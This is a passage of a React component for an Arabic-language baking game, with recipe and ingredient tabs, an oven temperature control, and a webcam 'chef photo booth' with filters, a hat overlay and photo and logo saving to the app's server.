                    ? 'bg-slate-900 text-orange-400 shadow-sm' 
                    : 'text-slate-500 hover:text-slate-300'
                }`}
              >
                مكوناتك للتسريع 🌾
              </button>
            </div>

            {/* TAB CONTENT: RECIPES */}
            {activeTab === 'recipes' && (
              <div className="grid grid-cols-4 gap-1.5 text-center animate-fadeIn">
                {[
                  { key: 'croissant', label: 'كرواسون', emoji: '🥐' },
                  { key: 'cake', label: 'كعكة', emoji: '🍰' },
                  { key: 'pie', label: 'فطيرة', emoji: '🥧' },
                  { key: 'cookie', label: 'كوكيز', emoji: '🍪' },
                  { key: 'pizza', label: 'بيتزا', emoji: '🍕' },
                  { key: 'bread', label: 'خبز', emoji: '🍞' },
                  { key: 'dough', label: 'عجينة', emoji: '🥣' },
                  { key: 'hamburger', label: 'همبرجر', emoji: '🍔' }
                ].map((item) => (
                  <button
                    key={item.key}
                    onClick={() => { playButtonPress(); setItemType(item.key as any); }}
                    disabled={isBaking}
                    className={`py-2 px-1 rounded-xl border flex flex-col items-center justify-center gap-1 transition-all active:scale-95 disabled:opacity-50 ${
                      itemType === item.key
                        ? 'border-orange-500/60 bg-orange-950/10 text-orange-300 shadow-[0_0_12px_rgba(249,115,22,0.15)]'
                        : 'border-slate-900 bg-slate-950/20 text-slate-500 hover:border-slate-800 hover:text-slate-300'
                    }`}
                  >
                    <span className="text-xl">{item.emoji}</span>
                    <span className="text-[10px] font-bold">{item.label}</span>
                  </button>
                ))}
              </div>
            )}

            {/* TAB CONTENT: INGREDIENTS */}
            {activeTab === 'ingredients' && (
              <div className="flex flex-col gap-2.5 animate-fadeIn">
                <div className="flex justify-between items-center text-[10px] text-slate-500">
                  <span>انقر لرمي المكون وتسريع النضج!</span>
                  <span className="text-yellow-500 font-bold bg-yellow-500/5 px-2 py-0.5 rounded border border-yellow-500/15">
                    مستوى جودة الوجبة الحالية: {bakeQuality}%
                  </span>
                </div>
                <div className="grid grid-cols-6 gap-1.5 text-center">
                  {[
                    { emoji: '🌾', label: 'دقيق' },
                    { emoji: '🧀', label: 'جبن' },
                    { emoji: '🍅', label: 'طماطم' },
                    { emoji: '🧈', label: 'زبدة' },
                    { emoji: '🍫', label: 'شوكولا' },
                    { emoji: '🍎', label: 'تفاح' }
                  ].map((ing, idx) => (
                    <button
                      key={idx}
                      onClick={() => handleLaunchIngredient(ing.emoji)}
                      className="py-2.5 bg-slate-900/60 hover:bg-slate-800/80 border border-slate-900 rounded-xl text-xl active:scale-75 transition-all shadow-sm"
                      title={ing.label}
                    >
                      {ing.emoji}
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>

          {/* Official Restaurant Chef Photo Booth Card */}
          <div className="bg-slate-950/60 border border-slate-900/90 rounded-2xl p-5 shadow-lg flex flex-col gap-3.5 relative overflow-hidden">
            {/* Camera Flash Overlay */}
            {flashActive && (
              <div className="absolute inset-0 bg-white/90 z-50 animate-fadeOut pointer-events-none" />
            )}

            <div className="flex flex-row-reverse items-center justify-between border-b border-slate-900 pb-2.5">
              <div className="flex items-center gap-2">
                <ChefHat className="w-4 h-4 text-emerald-400" />
                <h3 className="font-bold text-xs text-slate-300">محطة تصوير الشيف الرسمية 📸</h3>
              </div>
              <span className="text-[9px] text-emerald-400 bg-emerald-950/30 px-2 py-0.5 rounded-full font-mono font-bold">CHEF STUDIO</span>
            </div>

            <p className="text-[11px] text-slate-400 text-right leading-relaxed">
              التقط صورة رسمية لمطعمك وأنت ترتدي قبعة الشيف السحرية لمشاركتها مع جميع اللاعبين عالمياً!
            </p>

            {/* Smart Chef Hat Filter Toggle & Live Filters Selector */}
            <div className="flex flex-col gap-3">
              <label className="flex flex-row-reverse items-center justify-between cursor-pointer p-2.5 rounded-xl bg-slate-900/40 hover:bg-slate-900/70 border border-slate-900/50 transition-all">
                <span className="text-xs text-slate-200 font-semibold flex items-center gap-1.5">
                  تفعيل فلتر قبعة الشيف 👨‍🍳
                </span>
                <input
                  type="checkbox"
                  checked={chefHatEnabled}
                  onChange={(e) => { playButtonPress(); setChefHatEnabled(e.target.checked); }}
                  className="rounded bg-slate-800 border-slate-700 text-emerald-500 focus:ring-emerald-500 w-4 h-4 cursor-pointer"
                />
              </label>

              {/* Advanced Restaurant Environment Filters selector */}
              <div className="flex flex-col gap-1.5 bg-slate-900/30 p-2.5 border border-slate-900 rounded-xl">
                <div className="flex flex-row-reverse justify-between text-[10px] text-slate-400 font-bold">
                  <span>اختر جو وخلفية المطعم 🌟</span>
                  <span className="text-amber-500">فلاتر البث الحي</span>
                </div>
                <div className="grid grid-cols-4 gap-1.5">
                  {[
                    { id: 'normal', name: 'افتراضي 📷' },
                    { id: 'warm', name: 'مطعم دافئ 🥐' },
                    { id: 'gold', name: 'كلاسيك ذهبي 🎞️' },
                    { id: 'neon', name: 'شيف سايبر ⚡' }
                  ].map((f) => (
                    <button
                      key={f.id}
                      onClick={() => { playButtonPress(); setSelectedFilter(f.id as any); }}
                      className={`py-1.5 rounded-lg text-[9px] font-bold border transition-all ${
                        selectedFilter === f.id
                          ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md scale-[1.03]'
                          : 'bg-slate-900/60 text-slate-400 border-slate-800 hover:text-white'
                      }`}
                    >
                      {f.name}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Live Camera Feed Panel */}
            <div className="relative border-2 border-slate-800 rounded-2xl overflow-hidden aspect-video bg-slate-950 flex flex-col items-center justify-center group shadow-2xl">
              {chefCapturedPhoto ? (
                <div className="relative w-full h-full overflow-hidden animate-fadeIn">
                  {/* The captured frozen photo */}
                  <img
                    src={chefCapturedPhoto}
                    alt="صورة الشيف المجمدة"
                    className="w-full h-full object-cover transition-all duration-300"
                  />
                  
                  {/* Decorative stickers or badges on the captured image */}
                  <div className="absolute top-4 right-4 z-10 bg-emerald-600/90 backdrop-blur-sm border border-emerald-400 text-[10px] font-bold px-2.5 py-1 rounded-full text-white shadow-lg flex items-center gap-1">
                    <span>صورة الطاهي المعتمدة 👑</span>
                  </div>
                  
                  <div className="absolute top-4 left-4 z-10 flex gap-2 pointer-events-none">
                    <span className="text-xl filter drop-shadow-md select-none animate-pulse">⭐</span>
                    <span className="text-xl filter drop-shadow-md select-none animate-pulse" style={{ animationDelay: '0.5s' }}>🧁</span>
                  </div>

                  {/* Translucent Studio bottom border info */}
                  <div className="absolute bottom-0 inset-x-0 h-8 bg-slate-950/70 border-t border-emerald-500/30 flex items-center justify-between px-3 text-[9px] text-emerald-400 z-10 pointer-events-none font-mono">
                    <span>صورة مجمدة ومحمية بنجاح</span>
                    <span className="text-emerald-400 font-bold font-mono">SAVED CLEAN IN SETTINGS</span>
                  </div>

                  {/* Gentle flashing flash-success effect overlay */}
                  <div className="absolute inset-0 bg-white/5 pointer-events-none animate-pulse" style={{ animationDuration: '3.5s' }} />
                </div>
              ) : cameraActive ? (
                <div className="relative w-full h-full overflow-hidden">
                  {/* Glowing overhead kitchen fairy lights */}
                  {selectedFilter !== 'normal' && (
                    <div className="absolute top-0 inset-x-0 h-8 bg-gradient-to-b from-amber-500/20 via-amber-500/5 to-transparent z-10 pointer-events-none flex justify-around px-8">
                      <span className="w-1.5 h-1.5 bg-yellow-300 rounded-full animate-pulse shadow-[0_0_8px_#f59e0b]"></span>
                      <span className="w-1.5 h-1.5 bg-yellow-300 rounded-full animate-pulse shadow-[0_0_8px_#f59e0b]" style={{ animationDelay: '0.5s' }}></span>
                      <span className="w-1.5 h-1.5 bg-yellow-400 rounded-full animate-pulse shadow-[0_0_8px_#f59e0b]" style={{ animationDelay: '1s' }}></span>
                      <span className="w-1.5 h-1.5 bg-yellow-300 rounded-full animate-pulse shadow-[0_0_8px_#f59e0b]" style={{ animationDelay: '1.5s' }}></span>
                    </div>
                  )}

                  {/* Corner Bakery Silhouette Stamps to simulate background/cooking studio */}
                  <div className="absolute top-4 right-4 z-10 bg-slate-900/80 backdrop-blur-sm border border-slate-800 text-[11px] font-bold px-2.5 py-1 rounded-full text-white shadow-lg flex items-center gap-1.5 pointer-events-none">
                    <span className="w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
                    <span>استوديو الطهي 🔴</span>
                  </div>

                  <div className="absolute top-4 left-4 z-10 flex gap-2 pointer-events-none">
                    <span className="text-xl filter drop-shadow-md select-none animate-bounce" style={{ animationDuration: '3s' }}>🥐</span>
                    <span className="text-xl filter drop-shadow-md select-none animate-bounce" style={{ animationDuration: '4s', animationDelay: '1s' }}>🥖</span>
                  </div>

                  <video
                    ref={videoRef}
                    className="w-full h-full object-cover scale-x-[-1] transition-all duration-300"
                    style={{
                      filter: 
                        selectedFilter === 'warm'
                          ? 'sepia(0.18) saturate(1.3) contrast(1.05) brightness(1.02)'
                          : selectedFilter === 'gold'
                          ? 'sepia(0.35) saturate(1.25) contrast(1.1) brightness(0.95)'
                          : selectedFilter === 'neon'
                          ? 'hue-rotate(60deg) saturate(1.4) contrast(1.1) brightness(1.05)'
                          : 'none'
                    }}
                    playsInline
                    muted
                  />

                  {/* Interactive Customizable Chef Hat HTML Overlay */}
                  {chefHatEnabled && (
                    <div 
                      className="absolute select-none pointer-events-none drop-shadow-[0_10px_15px_rgba(0,0,0,0.7)]"
                      style={{ 
                        left: '50%',
                        transform: `translateX(-50%) translate(${chefHatX}%, 0)`,
                        top: `${chefHatY}%`,
                        fontSize: `${6.5 * chefHatScale}rem`,
                        transition: 'transform 0.1s ease-out, top 0.1s ease-out, font-size 0.1s ease-out'
                      }}
                    >
                      👨‍🍳
                    </div>
                  )}

                  {/* Real-time Alignment head guide frame overlay */}
                  <div className="absolute inset-0 border border-dashed border-slate-500/10 pointer-events-none flex items-center justify-center">
                    <div className="w-28 h-28 rounded-full border border-dashed border-amber-500/20 flex items-center justify-center">
                      <span className="text-[9px] text-slate-500 font-mono tracking-widest uppercase">ALIGN HEAD</span>
                    </div>
                  </div>

                  {/* Translucent Studio bottom border info */}
                  <div className="absolute bottom-0 inset-x-0 h-8 bg-slate-950/70 border-t border-amber-500/30 flex items-center justify-between px-3 text-[9px] text-slate-400 z-10 pointer-events-none font-mono">
                    <span>BAKERY PHOTO BOOTH v2.0</span>
                    <span className="text-amber-500 font-bold">FILTER: {selectedFilter.toUpperCase()}</span>
                  </div>
                </div>
              ) : (
                <div className="flex flex-col items-center justify-center p-4 text-center gap-2">
                  <div className="w-10 h-10 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-600">
                    📸
                  </div>
                  <span className="text-[10px] text-slate-500">مستشعر الكاميرا غير مفعل حالياً</span>
                  <button
                    onClick={() => { playButtonPress(); initCamera(); }}
                    className="px-4 py-1.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 text-[10px] font-bold rounded-lg text-slate-300 active:scale-95 transition-all shadow-md"
                  >
                    تفعيل الكاميرا الآن 📷
                  </button>
                </div>
              )}
            </div>

            {/* Chef Hat Real-Time Alignment Controls (Only shown if hat filter is active) */}
            {chefHatEnabled && cameraActive && (
              <div className="bg-slate-900/30 border border-slate-900 rounded-xl p-3 flex flex-col gap-2.5 animate-fadeIn">
                <div className="flex flex-row-reverse justify-between items-center text-[10px] text-slate-400 font-bold border-b border-slate-900 pb-1.5">
                  <span className="text-amber-400">🔧 أشرطة ضبط وموازنة قبعة الشيف السحرية</span>
                  <button 
                    onClick={() => {
                      playButtonPress();
                      setChefHatX(0);
                      setChefHatY(15);
                      setChefHatScale(1.2);
                    }}
                    className="text-[8px] text-slate-500 hover:text-slate-300 underline"
                  >
                    إعادة تعيين الافتراضي
                  </button>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-3 gap-2 text-[10px]">
                  {/* Height Position */}
                  <div className="flex flex-col gap-1 text-right">
                    <span className="text-slate-400">الارتفاع العمودي: <span className="text-amber-500 font-mono font-bold">{chefHatY}%</span></span>
                    <input 
                      type="range" 
                      min="0" 
                      max="80" 
                      value={chefHatY} 
                      onChange={(e) => setChefHatY(Number(e.target.value))}
                      className="w-full accent-amber-500 bg-slate-900 h-1 rounded-lg cursor-pointer"
                    />
                  </div>

                  {/* Horizontal Position */}
                  <div className="flex flex-col gap-1 text-right">
                    <span className="text-slate-400">الموقع الأفقي: <span className="text-amber-500 font-mono font-bold">{chefHatX}%</span></span>
                    <input 
                      type="range" 
                      min="-40" 
                      max="40" 
                      value={chefHatX} 
                      onChange={(e) => setChefHatX(Number(e.target.value))}
                      className="w-full accent-amber-500 bg-slate-900 h-1 rounded-lg cursor-pointer"
                    />
                  </div>

                  {/* Scale Size */}
                  <div className="flex flex-col gap-1 text-right">
                    <span className="text-slate-400">حجم القبعة: <span className="text-amber-500 font-mono font-bold">{chefHatScale.toFixed(1)}x</span></span>
                    <input 
                      type="range" 
                      min="0.5" 
                      max="2.5" 
                      step="0.05"
                      value={chefHatScale} 
                      onChange={(e) => setChefHatScale(Number(e.target.value))}
                      className="w-full accent-amber-500 bg-slate-900 h-1 rounded-lg cursor-pointer"
                    />
                  </div>
                </div>
              </div>
            )}

            {/* Snap Action Button */}
            {chefCapturedPhoto ? (
              <button
                onClick={() => {
                  playButtonPress();
                  setChefCapturedPhoto(null);
                  initCamera();
                }}
                className="py-2.5 px-4 bg-gradient-to-r from-amber-600 to-yellow-500 hover:from-amber-500 hover:to-yellow-400 active:scale-95 text-white text-xs font-bold rounded-xl transition-all shadow-[0_4px_15px_rgba(245,158,11,0.2)] flex items-center justify-center gap-2 border border-yellow-400/10 cursor-pointer"
              >
                <Camera className="w-4 h-4" />
                <span>التقاط صورة جديدة 📷</span>
              </button>
            ) : (
              <button
                onClick={async () => {
                  if (!cameraActive) {
                    playButtonPress();
                    initCamera();
                    return;
                  }
                  playButtonPress();
                  setFlashActive(true);
                  setTimeout(() => setFlashActive(false), 150);
                  await capturePhoto(true);
                  triggerConfetti();
                }}
                className="py-2.5 px-4 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 active:scale-95 text-white text-xs font-bold rounded-xl transition-all shadow-[0_4px_15px_rgba(16,185,129,0.2)] flex items-center justify-center gap-2 border border-emerald-400/10 cursor-pointer"
              >
                <Camera className="w-4 h-4 fill-current" />
                <span>التقاط ومشاركة الصورة الرسمية للمطعم 🌟</span>
              </button>
            )}
          </div>

        </div>

        {/* Left column: Realistic Oven Visualizer and core progress triggers */}
        <div className="lg:col-span-7 flex flex-col gap-6 items-center justify-center">
          
          {/* Baking progress strip */}
          {isBaking && (
            <div className="w-full max-w-[480px] bg-slate-950 rounded-xl h-4 border border-slate-900 overflow-hidden relative shadow-inner">
              <div
                className="bg-gradient-to-l from-orange-500 to-amber-400 h-full rounded-xl transition-all duration-300 shadow-[0_0_12px_rgba(249,115,22,0.6)]"
                style={{ width: `${bakeProgress}%` }}
              />
              <div className="absolute inset-0 flex items-center justify-center text-[8px] font-mono font-bold text-white tracking-widest uppercase">
                BAKING... {bakeProgress}% (QUALITY: {bakeQuality}%)
              </div>
            </div>
          )}

          {/* Realistic Oven Screen */}
          <Oven
            temperature={temperature}
            isBaking={isBaking}
            bakeProgress={bakeProgress}
            itemType={itemType}
            showSteam={steamMode}
            addedIngredients={addedIngredients}
          />

          {/* Oven heat control & slider */}
          <div className="w-full max-w-[480px] bg-slate-950/40 border border-slate-900 rounded-2xl p-4 shadow-sm flex flex-col gap-2">
            <div className="flex justify-between items-center text-xs">
              <span className="text-orange-400 font-mono font-extrabold">{temperature}°م</span>
              <span className="text-slate-400 font-bold">منظم درجة حرارة الفرن</span>
            </div>
            <input
              type="range"
              min="100"
              max="500"
              step="25"
              value={temperature}
              disabled={isBaking}
              onChange={(e) => setTemperature(Number(e.target.value))}
              className="w-full accent-orange-500 bg-slate-950 h-1.5 rounded-lg cursor-pointer border border-slate-900 disabled:opacity-50"
            />
            <p className="text-[9px] text-slate-500 text-right leading-normal">
              الحرارة المرتفعة تسرّع نضج الطعام، بينما رمي المكونات السحرية يمنح طعامك جودة فخمة تضاعف أرباحك!
            </p>
          </div>

          {/* Oven controls (Start baking or Cancel back) */}
          <div className="w-full max-w-[480px] flex gap-3">
            {isBaking && (
              <button
                onClick={handleCancelBaking}
                className="px-5 bg-red-950/60 hover:bg-red-900 text-red-200 border border-red-900/40 rounded-2xl flex items-center justify-center gap-2 font-bold text-sm transition-all active:scale-95 shadow-md"
              >
                <RotateCcw className="w-4 h-4" />
                <span>إلغاء والرجوع</span>
              </button>
            )}

            <button
              onClick={handleStartBaking}
              disabled={isBaking}
              className={`relative flex-1 py-4 rounded-2xl font-extrabold text-sm md:text-base transition-all transform active:scale-[0.98] flex items-center justify-center gap-2.5 overflow-hidden shadow-xl group ${
                isBaking
                  ? 'bg-slate-900 text-slate-600 border border-slate-950 cursor-not-allowed'
                  : 'bg-gradient-to-l from-orange-600 to-amber-500 text-white hover:from-orange-500 hover:to-amber-400 border border-orange-500 shadow-[0_0_20px_rgba(249,115,22,0.3)]'
              }`}
            >
              {!isBaking && (
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:animate-shimmer" style={{ animationDuration: '1.5s' }} />
              )}
              <Zap className={`w-4.5 h-4.5 ${isBaking ? 'text-slate-600' : 'text-white animate-pulse'}`} />
              <span>{isBaking ? 'جاري الطهي والتحميص...' : 'اضغط لبدء الطبخ والخبز بالفرن'}</span>
            </button>
          </div>

          {/* Success Reward Banner */}
          {lastBakeSuccess && (
            <div className="w-full max-w-[480px] text-center animate-bounce text-xs font-bold text-yellow-300 bg-yellow-500/5 border border-yellow-500/20 py-2.5 px-4 rounded-xl flex items-center justify-center gap-2 shadow-sm">
              <Sparkles className="w-4 h-4 text-yellow-400" />
              <span>✨ تم الخبز بنجاح! جودة الوجبة وصلت {bakeQuality}%! سلّمها للزبون واكسب المال! ✨</span>
            </div>
          )}

        </div>

      </main>

      {/* Settings / Historical unlock database */}
      {showSettings && (
        <SecretLog
          onClose={() => setShowSettings(false)}
          neonMode={neonMode}
          setNeonMode={setNeonMode}
          steamMode={steamMode}
          setSteamMode={setSteamMode}
          authToken={authToken}
        />
      )}

      {/* Onboarding Logo Maker Modal */}
      <LogoMakerModal
        isOpen={showLogoMaker}
        onClose={() => setShowLogoMaker(false)}
        onSave={(logoBase64) => {
          localStorage.setItem('restaurant_logo', logoBase64);
          setRestaurantLogo(logoBase64);
          setShowLogoMaker(false);
          triggerConfetti();

          // Save officially to server as well
          saveCapture({
            photo: logoBase64,
            timestamp: Date.now(),
            itemType: itemType,
            temperature: temperature,
            isOfficial: true
          }).catch((err) => console.warn('Saving logo capture failed:', err));

          saveCaptureToServer({
            photo: logoBase64,
            timestamp: Date.now(),
            itemType: itemType,
            temperature: temperature,
            isOfficial: true
          }, authToken).catch((err) => console.warn('Saving logo to server failed:', err));
        }}
      />

      {/* Simplified clean footer */}
      <footer className="relative w-full max-w-5xl mx-auto flex justify-between items-center border-t border-slate-950 pt-5 mt-4 text-[10px] text-slate-600 font-mono z-10">
        <span>مستشعرات حرارية احترافية ومؤثرات واقعية</span>
        <span>© 2026 المطبخ التفاعلي الذكي</span>
      </footer>

    </div>
  );
}
